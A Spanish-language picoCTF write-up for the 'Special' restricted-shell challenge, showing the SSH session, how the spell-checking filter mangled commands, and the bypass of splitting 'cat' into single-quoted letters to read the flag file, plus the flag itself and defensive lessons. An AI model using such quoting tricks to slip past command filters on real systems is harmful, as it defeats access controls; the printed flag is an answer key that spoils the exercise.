##  Special
## Descripcion

Don't power users get tired of making spelling mistakes in the shell? Not anymore! Enter Special, the Spell Checked Interface for Affecting Linux. Now, every word is properly spelled and capitalized... automatically and behind-the-scenes! Be the first to test Special in beta, and feel free to tell us all about how Special streamlines every development process that you face. When your co-workers see your amazing shell interface, just tell them: That's Special (TM)Start your instance to see connection details.`ssh -p 50982 ctf-player@saturn.picoctf.net`The password is `af86add3`

## Solucion
### solucion 1_ usando python

un reto de **Restricted Shell Escape** (escape de shell restringida). Al conectarte por SSH, en lugar de una bash normal, caías en una **shell personalizada y filtrada** llamada "Special" que interceptaba y modificaba tus comandos antes de ejecutarlos.

```bash
BelovedCis-picoctf@webshell:~$ ssh -p 57867 ctf-player@saturn.picoctf.net
The authenticity of host '[saturn.picoctf.net]:57867 ([13.59.203.175]:57867)' can't be established.
ED25519 key fingerprint is SHA256:tJ0wuU5yBvNO/FrkHmR9iY36VJClMhKV+Hq2sxqKFmg.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:13: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[saturn.picoctf.net]:57867' (ED25519) to the list of known hosts.
ctf-player@saturn.picoctf.net's password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 6.8.0-1044-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Special$ ls
Is 
sh: 1: Is: not found
Special$ \ls
Als 
Special$ /bin/cat b*/f*
Absolutely not paths like that, please!
Special$ read x < blargh/flag.txt; echo $x
Read i < blargh/flag.txt; echo ex 
sh: 1: Read: not found
ex
Special$ 'c''a''t' blargh/flag.txt
'c''a''t' blargh/flag.txt 
picoCTF{5p311ch3ck_15_7h3_w0r57_6a2763f6}Special$ Connection to saturn.picoctf.net closed by remote host.
Connection to saturn.picoctf.net closed.
BelovedCis-picoctf@webshell:~$ 
```

## ¿Cómo funcionaba el filtro?

La shell aplicaba transformaciones a los comandos escritos directamente. Puedes ver el patrón:

|Lo que escribías|Lo que ejecutaba|Resultado|
|---|---|---|
|`ls`|`Is`|comando no encontrado|
|`\ls`|`Als`|comando no encontrado|
|`` `ls` ``|`Also`|comando no encontrado|
|`< blargh`|`< large`|no encontrado|
|`read x < ...`|`Read i < ...`|modificado|
|`/bin/cat b*/f*`|bloqueado explícitamente|mensaje de error especial|

El filtro parecía operar sobre el texto en bruto, **reemplazando letras y palabras clave**. Por ejemplo, la `l` minúscula al inicio se convertía en `I` mayúscula, los paths con wildcards estaban bloqueados explícitamente, etc.

---

## ¿Por qué funcionó `'c''a''t' blargh/flag.txt`?

Esta es la técnica clave. En bash, las **comillas simples** alrededor de caracteres individuales producen el mismo carácter literal, pero el parser de la shell los trata como tokens separados antes de unirlos. Entonces:

```
'c''a''t'  →  cat  (después de que bash procesa las comillas)
```

El filtro de la shell especial **no reconoció** `'c''a''t'` como la palabra `cat`, así que lo dejó pasar sin modificarlo. Bash luego concatenó los caracteres y ejecutó `cat` normalmente.

Lo mismo ocurrió antes con `'l''s'` que sí ejecutó `ls` y mostró el directorio `blargh`.


Respuesta:  picoCTF{5p311ch3ck_15_7h3_w0r57_6a2763f6}
## Notas

En bash, las comillas simples preservan el valor literal de cada carácter que encierran. Al separar cada letra de un comando entre sus propias comillas simples (`'c''a''t'`), se logra que el intérprete de la shell restringida no reconozca el patrón de texto que está buscando filtrar, mientras que bash lo reconstruye correctamente al momento de ejecutar.

1. Los filtros de texto plano en shells son bypasseables mediante mecanismos de quoting de bash.
2. Nunca se debe confiar en filtros basados en coincidencia de strings para implementar seguridad en shells.
3. El approach correcto para una restricted shell segura es usar shells diseñadas para ello (como `rbash`) con permisos de sistema de archivos adecuados, no filtros de texto.
## Referencias

- **Bash manual - Quoting:** [https://www.gnu.org/software/bash/manual/bash.html#Quoting](https://www.gnu.org/software/bash/manual/bash.html#Quoting)
- **Restricted Shell Escape techniques:** [https://book.hacktricks.xyz/linux-hardening/bypass-bash-restrictions](https://book.hacktricks.xyz/linux-hardening/bypass-bash-restrictions)
- **picoCTF plataforma:** [https://picoctf.org](https://picoctf.org)
- **GTFOBins** (referencia general de bypass): [https://gtfobins.github.io](https://gtfobins.github.io)